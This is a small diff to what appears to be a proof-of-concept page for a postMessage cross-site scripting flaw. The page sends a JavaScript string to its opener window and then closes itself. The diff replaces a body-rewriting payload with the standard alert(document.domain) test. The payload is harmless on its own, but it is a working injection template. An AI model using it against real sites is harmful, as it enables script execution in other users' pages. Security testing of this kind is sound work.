@@ -1,5 +1,5 @@
 <script>
-payload = "document.body.innerHTML = '<h1>IT WORKED!</h1>';";
+payload = "alert(document.domain);";
 window.opener.postMessage({maVariable: payload}, '*');
 window.close();
 </script>
